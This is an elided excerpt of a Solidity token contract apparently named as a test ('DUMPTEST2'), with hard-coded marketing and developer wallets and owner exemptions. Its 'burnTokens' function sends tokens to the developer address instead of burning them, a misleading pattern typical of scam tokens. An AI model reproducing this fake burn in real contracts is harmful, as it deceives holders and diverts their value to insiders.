...
contract TESTDUMP2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;

    string private constant _name = "DUMPTEST2";
    string private constant _symbol = "DTEST2";
    ...
    address payable private _marketingAddress = payable(0xd4d3f63A65678747e2A845c78968b02beDa918b5);
    address public constant devAddress = 0x1b786B7bC32E8adD5e2BdDb13D4d01519F008AF0;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (to != uniswapV2Pair && to != _marketingAddress && to != address(this) && to != devAddress) {
    ...
    function burnTokens(uint256 burntAmount) private {
        _transfer(address(this), devAddress, burntAmount);
    }
